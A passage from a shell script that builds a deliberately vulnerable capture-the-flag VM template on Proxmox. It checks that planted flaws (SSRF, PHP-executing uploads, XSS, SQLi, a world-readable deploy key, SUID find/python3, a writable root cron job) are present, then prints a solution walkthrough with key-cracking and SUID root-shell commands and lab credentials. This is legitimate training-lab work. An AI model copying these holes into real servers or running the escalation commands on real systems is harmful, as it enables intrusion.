  # Cron artifact: present, writable by $SSH_USER, NOT writable by saguarobot.
  - [ sh, -c, 'if [ -f /etc/cron.d/saguaro-fieldsync ] && su -s /bin/sh $SSH_USER -c "test -w /opt/saguaro/field-sync.sh" && ! su -s /bin/sh saguarobot -c "test -w /opt/saguaro/field-sync.sh"; then echo "CRON_ARTIFACT=yes" >> /etc/cybercore-bake.env; else echo "CRON_ARTIFACT=no" >> /etc/cybercore-bake.env; fi' ]

  # Flags: content, exact perms, and NOT readable one rung down the chain.
  - [ sh, -c, 'm=\$(stat -c "%a %U %G" /home/$SSH_USER/user.txt 2>/dev/null); if grep -Fq "FLAG{" /home/$SSH_USER/user.txt 2>/dev/null && [ "\$m" = "640 $SSH_USER $SSH_USER" ] && ! su -s /bin/sh saguarobot -c "cat /home/$SSH_USER/user.txt" >/dev/null 2>&1; then echo "USER_FLAG=yes" >> /etc/cybercore-bake.env; else echo "USER_FLAG=no (\$m)" >> /etc/cybercore-bake.env; fi' ]
  - [ sh, -c, 'm=\$(stat -c "%a %U" /root/root.txt 2>/dev/null); if grep -Fq "FLAG{" /root/root.txt 2>/dev/null && [ "\$m" = "600 root" ] && ! su -s /bin/sh $SSH_USER -c "cat /root/root.txt" >/dev/null 2>&1; then echo "ROOT_FLAG=yes" >> /etc/cybercore-bake.env; else echo "ROOT_FLAG=no (\$m)" >> /etc/cybercore-bake.env; fi' ]

  # Both layers of the cloud-init sudo guard are in place, and saguarobot holds
  # neither the blanket sudoers file nor 'sudo' group membership.
  - [ sh, -c, 'if [ -f /etc/cloud/cloud.cfg.d/99-cybercore-default-user.cfg ] && systemctl is-enabled cybercore-sudo-guard.service >/dev/null 2>&1 && [ ! -e /etc/sudoers.d/90-cloud-init-users ] && ! id -nG saguarobot | grep -qw sudo; then echo "SUDO_GUARD=yes" >> /etc/cybercore-bake.env; else echo "SUDO_GUARD=no" >> /etc/cybercore-bake.env; fi' ]

  # NEGATIVE: saguarobot must hold NO sudo grant whatsoever. Replaces the old
  # SUDO_PYTHON marker — that privesc is gone, superseded by the SSH stage.
  - [ sh, -c, 'if [ -e /etc/sudoers.d/saguarobot-python ] || sudo -l -U saguarobot 2>/dev/null | grep -q NOPASSWD; then echo "SUDOERS_CLEAN=no" >> /etc/cybercore-bake.env; else echo "SUDOERS_CLEAN=yes" >> /etc/cybercore-bake.env; fi' ]

  # Diagnostic only, not asserted: systemd mounts /tmp as nosuid tmpfs on
  # Debian 13, which silently breaks "cp /bin/bash /tmp/rootbash" cron payloads.
  - [ sh, -c, 'echo "TMP_OPTS=\$(findmnt -no OPTIONS /tmp 2>/dev/null | tr -d " " )" >> /etc/cybercore-bake.env' ]

  - [ sh, -c, 'echo "BAKE_COMPLETE=yes" >> /etc/cybercore-bake.env' ]

  # ---- Cleanup ----
  # Drop the clone (token may be in its remote URL) before sealing.
  - [ sh, -c, 'rm -rf /opt/cybersaguaros-src' ]
  - [ sh, -c, 'rm -f /etc/resolv.conf; ln -s ../run/resolvconf/resolv.conf /etc/resolv.conf' ]
  - [ sh, -c, 'cp /var/log/cloud-init-output.log /etc/cybercore-cloud-init.log 2>/dev/null || true' ]
  - [ sh, -c, 'rm -f /etc/netplan/50-cloud-init.yaml /etc/network/interfaces.d/50-cloud-init 2>/dev/null || true' ]
  - [ cloud-init, clean, --logs, --seed ]

power_state:
  mode: poweroff
  delay: '+1'
  message: 'CyberSaguaros template bake complete'
  timeout: 1800
SNIPPET

echo "==> Wrote bake snippet: $USERDATA_PATH"

# ---------- 3. Create VM ----------
echo "==> Creating VM $VMID ($NAME)..."
NET0="virtio,bridge=${BAKE_BRIDGE},firewall=0"
[ -n "${BAKE_VLAN:-}" ] && NET0="${NET0},tag=${BAKE_VLAN}"

qm create $VMID \
  --name "$NAME" \
  --memory $MEMORY \
  --cores $CORES \
  --cpu host \
  --machine q35 \
  --bios seabios \
  --scsihw virtio-scsi-pci \
  --net0 "$NET0" \
  --serial0 socket --vga serial0 \
  --agent enabled=1,fstrim_cloned_disks=1 \
  --ostype l26 \
  --description "CyberSaguaros SSRF portal template (nginx+PHP-FPM+MariaDB). Baked from bake-cybersaguaros-template.sh."

echo "==> Importing cloud image as VM disk..."
qm disk import $VMID "$CLOUD_IMG_LOCAL" "$STORAGE"
qm set $VMID --scsi0 "${STORAGE}:vm-${VMID}-disk-0,discard=on,ssd=1"
qm set $VMID --boot order=scsi0
qm resize $VMID scsi0 ${DISK_GB}G || true
qm set $VMID --ide2 "${STORAGE}:cloudinit"

qm set $VMID \
  --ciuser saguarobot \
  --cipassword "$SAGUAROBOT_PASSWORD" \
  --ipconfig0 ip=dhcp \
  --nameserver "$BAKE_DNS" \
  --cicustom "user=${SNIPPET_STORAGE}:snippets/$(basename "$USERDATA_PATH")"

# ---------- 4. Boot + wait ----------
echo "==> Starting VM (cloud-init installs LNMP + the portal; ~8-12 min)..."
qm start $VMID

DEADLINE=$(( $(date +%s) + 1200 ))
while true; do
  STATUS=$(qm status $VMID | awk '{print $2}')
  [ "$STATUS" = "stopped" ] && { echo "==> VM powered off."; break; }
  if [ $(date +%s) -ge $DEADLINE ]; then
    echo "ERROR: cloud-init did not finish in time. Inspect: qm terminal $VMID" >&2
    exit 1
  fi
  sleep 15
done

# ---------- 4b. Pre-seal verification ----------
echo "==> Verifying bake markers..."
VERIFY_DEV=""
case "$STORAGE" in
  *ceph*|vmpool|rbd*)
    VERIFY_DEV=$(rbd map ${STORAGE}/vm-${VMID}-disk-0 --id admin 2>/dev/null) || VERIFY_DEV=""
    ;;
esac

if [ -z "$VERIFY_DEV" ]; then
  echo "WARNING: skipping marker verification (storage '$STORAGE' not a Ceph rbd pool)."
else
  for _ in 1 2 3 4 5; do
    partprobe "$VERIFY_DEV" 2>/dev/null || true
    udevadm settle 2>/dev/null || true
    [ -b "${VERIFY_DEV}p1" ] && break
    sleep 2
  done
  VERIFY_MOUNT=$(mktemp -d)
  if mount -o ro "${VERIFY_DEV}p1" "$VERIFY_MOUNT" 2>/dev/null; then
    BAKE_ENV="$VERIFY_MOUNT/etc/cybercore-bake.env"
    FAIL=0
    if [ -f "$BAKE_ENV" ]; then
      # -F= with an exact key match: the old /^KEY=/ regex also matched KEY2=,
      # and $2 truncated any value that itself contained '='.
      get() { awk -F= -v k="$1" '$1==k {sub(/^[^=]*=/,""); print; exit}' "$BAKE_ENV"; }
      BAKE_COMPLETE=$(get BAKE_COMPLETE)
      APP_SRC=$(get APP_SRC)
      PORT_80=$(get PORT_80_LISTEN)
      SITE_HTTP=$(get SITE_HTTP)
      SSRF_EP=$(get SSRF_ENDPOINT)
      INTERNAL_OK=$(get INTERNAL_OK)
      UPLOAD_EXEC=$(get UPLOAD_EXEC)
      XSS_REFLECT=$(get XSS_REFLECT)
      SQLI_EP=$(get SQLI_ENDPOINT)
      DEPLOY_KEY=$(get DEPLOY_KEY)
      KEY_ENCRYPTED=$(get KEY_ENCRYPTED)
      SSH_KEY_E2E=$(get SSH_KEY_E2E)
      M_SUID_FIND=$(get SUID_FIND)
      M_SUID_PY=$(get SUID_PYTHON)
      M_SUID_GATED=$(get SUID_GATED)
      M_BOT_TOOLS=$(get BOT_TOOLS)
      M_CRON=$(get CRON_ARTIFACT)
      M_USER_FLAG=$(get USER_FLAG)
      M_ROOT_FLAG=$(get ROOT_FLAG)
      SUDO_GUARD=$(get SUDO_GUARD)
      SUDOERS_CLEAN=$(get SUDOERS_CLEAN)
      M_TMP_OPTS=$(get TMP_OPTS)
      echo "    bake complete:        ${BAKE_COMPLETE:-no}"
      echo "    app source found:     ${APP_SRC:-unknown}"
      echo "    :80 listening:        ${PORT_80:-unknown}"
      echo "    site HTTP 200:        ${SITE_HTTP:-unknown}"
      echo "    SSRF endpoint:        ${SSRF_EP:-unknown}"
      echo "    internal API:         ${INTERNAL_OK:-unknown}"
      echo "    uploads exec PHP:     ${UPLOAD_EXEC:-unknown}"
      echo "    reflected XSS:        ${XSS_REFLECT:-unknown}"
      echo "    SQLi endpoint:        ${SQLI_EP:-unknown}"
      echo "    deploy key readable:  ${DEPLOY_KEY:-unknown}"
      echo "    key needs passphrase: ${KEY_ENCRYPTED:-unknown}"
      echo "    key -> SSH e2e:       ${SSH_KEY_E2E:-unknown}"
      echo "    SUID find (gated):    ${M_SUID_FIND:-unknown}"
      echo "    SUID python3 (gated): ${M_SUID_PY:-unknown}"
      echo "    gate holds vs bot:    ${M_SUID_GATED:-unknown}"
      echo "    bot can still enum:   ${M_BOT_TOOLS:-unknown}"
      echo "    root cron artifact:   ${M_CRON:-unknown}"
      echo "    user flag:            ${M_USER_FLAG:-unknown}"
      echo "    root flag:            ${M_ROOT_FLAG:-unknown}"
      echo "    sudo guard armed:     ${SUDO_GUARD:-unknown}"
      echo "    saguarobot sudo-free: ${SUDOERS_CLEAN:-unknown}"
      echo "    /tmp mount options:   ${M_TMP_OPTS:-unknown}   (nosuid breaks /tmp/rootbash payloads)"
      [ "$BAKE_COMPLETE" != "yes" ] && { echo "ERROR: runcmd did not complete"; FAIL=1; }
      [ "$APP_SRC" != "yes" ]      && { echo "ERROR: '$CHALLENGE_DIR' not found in the clone — challenge source path is wrong"; FAIL=1; }
      [ "$PORT_80" != "yes" ]      && { echo "ERROR: :80 not listening"; FAIL=1; }
      [ "$SITE_HTTP" != "yes" ]    && { echo "ERROR: portal not serving HTTP 200"; FAIL=1; }
      [ "$SSRF_EP" != "yes" ]      && { echo "ERROR: SSRF verify endpoint not responding"; FAIL=1; }
      [ "$INTERNAL_OK" != "yes" ]  && { echo "ERROR: internal provisioning API not working"; FAIL=1; }
      [ "$UPLOAD_EXEC" != "yes" ]  && { echo "ERROR: uploads dir does not execute PHP (RCE path broken)"; FAIL=1; }
      [ "$XSS_REFLECT" != "yes" ]  && { echo "ERROR: /research.php?q= still escapes the payload (reflected XSS missing)"; FAIL=1; }
      [ "$SQLI_EP" != "yes" ]      && { echo "ERROR: /research.php?q= no longer surfaces a SQL error (SQLi regressed)"; FAIL=1; }
      [ "$DEPLOY_KEY" != "yes" ]   && { echo "ERROR: deploy key missing, not encrypted, or unreadable by saguarobot"; FAIL=1; }
      [ "$KEY_ENCRYPTED" != "yes" ] && { echo "ERROR: deploy key authenticates with NO passphrase — the cracking stage is skippable"; FAIL=1; }
      [ "$SSH_KEY_E2E" != "yes" ]  && { echo "ERROR: passphrase/pubkey/sshd mismatch — if OpenSSH rejected RSA-PEM, re-bake with -t ed25519"; FAIL=1; }
      [ "$M_SUID_FIND" != "yes" ]  && { echo "ERROR: group-gated SUID find missing or wrong mode/owner"; FAIL=1; }
      [ "$M_SUID_PY" != "yes" ]    && { echo "ERROR: SUID python3 did not run as euid 0 (copied interpreter may not resolve its stdlib)"; FAIL=1; }
      [ "$M_SUID_GATED" != "yes" ] && { echo "ERROR: saguarobot CAN execute the SUID toolkit — the webshell short-circuits straight to root"; FAIL=1; }
      [ "$M_BOT_TOOLS" != "yes" ]  && { echo "ERROR: saguarobot can no longer run find/python3 — SUID_DIR is shadowing /usr/bin on PATH"; FAIL=1; }
      [ "$M_CRON" != "yes" ]       && { echo "ERROR: root cron artifact missing, or writable by the wrong account"; FAIL=1; }
      [ "$M_USER_FLAG" != "yes" ]  && { echo "ERROR: user.txt missing, wrong perms, or readable by saguarobot"; FAIL=1; }
      [ "$M_ROOT_FLAG" != "yes" ]  && { echo "ERROR: /root/root.txt missing, wrong perms, or readable by $SSH_USER"; FAIL=1; }
      [ "$SUDO_GUARD" != "yes" ]   && { echo "ERROR: cloud-init sudo guard not armed — lane clones will re-grant saguarobot NOPASSWD:ALL"; FAIL=1; }
      [ "$SUDOERS_CLEAN" != "yes" ] && { echo "ERROR: saguarobot still holds a sudo grant — the lateral-movement stage is bypassable"; FAIL=1; }
    else
      echo "ERROR: /etc/cybercore-bake.env not found"
      FAIL=1
    fi

    if [ "$FAIL" = "1" ]; then
      LOG_FILE="$VERIFY_MOUNT/etc/cybercore-cloud-init.log"
      [ -f "$LOG_FILE" ] || LOG_FILE="$VERIFY_MOUNT/var/log/cloud-init-output.log"
      echo ""
      echo "==================================================================="
      echo "  Last 80 lines of cloud-init log inside the VM:"
      echo "==================================================================="
      tail -80 "$LOG_FILE" 2>/dev/null | sed 's/^/    /' || echo "    (no log)"
      umount "$VERIFY_MOUNT"; rmdir "$VERIFY_MOUNT"
      rbd unmap "$VERIFY_DEV" 2>/dev/null || true
      echo ""
      echo "Refusing to seal a broken template. VM $VMID left intact for inspection."
      exit 1
    fi
    umount "$VERIFY_MOUNT"
    echo "==> All bake markers OK."
  else
    echo "WARNING: could not mount ${VERIFY_DEV}p1 — skipping verification."
  fi
  rmdir "$VERIFY_MOUNT" 2>/dev/null || true
  rbd unmap "$VERIFY_DEV" 2>/dev/null || true
fi

# ---------- 5. Strip bake-time cloud-init config ----------
echo "==> Clearing bake-time cicustom + cloud-init fields..."
qm set $VMID --delete cicustom
qm set $VMID --delete nameserver 2>/dev/null || true
qm set $VMID --delete searchdomain 2>/dev/null || true
# Drop ciuser/cipassword too. Only `cicustom` used to be stripped, so
# --ciuser saguarobot survived into the template and every lane clone booted on
# Proxmox's generated user-data with `user: saguarobot` + `users: [default]` —
# the trigger for cloud-init's default-user NOPASSWD:ALL grant. With no `user:`
# key there is nothing for that grant to attach to, which backs up the in-guest
# cloud.cfg.d drop-in. saguarobot's password is already baked into the
# template's /etc/shadow via plain_text_passwd, so console login is unaffected.
qm set $VMID --delete ciuser 2>/dev/null || true
qm set $VMID --delete cipassword 2>/dev/null || true

# ---------- 6. Convert to template ----------
echo "==> Converting VM to template..."
qm template $VMID

echo ""
echo "==================================================================="
echo "  CyberSaguaros template $VMID baked successfully"
echo "==================================================================="
echo "  Portal admin:   dr.wagner / arizona"
echo "  Web foothold:   saguarobot (PHP-FPM pool user) -- NO sudo by design"
echo "  Lateral:        -> $SSH_USER via the world-readable deploy key"
echo "                    $DEPLOY_DIR/id_rsa  (0644, RSA-PEM, passphrase)"
echo "                    named by /opt/saguaro/field-sync.sh"
echo "                    ssh2john id_rsa > k.hash"
echo "                    john --wordlist=rockyou.txt k.hash  -> $DEPLOY_KEY_PASSPHRASE"
echo "                    chmod 600 id_rsa && ssh -i id_rsa $SSH_USER@<ip>"
echo "  User flag:      /home/$SSH_USER/user.txt"
echo "                    $USER_FLAG_VALUE"
echo "  Root privesc:   any of these (all gated to group $PRIV_GROUP)"
echo "                    $SUID_DIR/find . -exec /bin/sh -p \\; -quit"
echo "                    $SUID_DIR/python3 -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'"
echo "                    /opt/saguaro/field-sync.sh  (0775 root:$PRIV_GROUP,"
echo "                      run by /etc/cron.d/saguaro-fieldsync every minute)"
echo "  Root flag:      /root/root.txt"
echo "                    $ROOT_FLAG_VALUE"
echo "  Red herring:    dvalmont / $DVALMONT_PASSWORD  (SSH works, leads nowhere)"
echo "  Off-path:       reflected XSS + SQLi on /research.php?q="
echo "  Instructor:     $SSH_USER / $SSH_PASSWORD (not crackable, console use)"
echo "  Reach via:      http://<lane-subnet>.<ip_octet>/"
echo "  Attach with:   POST /api/admin/lanes/<laneId>/modules"
echo "                 { \"challenge_key\": \"cybersaguaros-ssrf\", \"module\": \"crucible\" }"
echo "==================================================================="
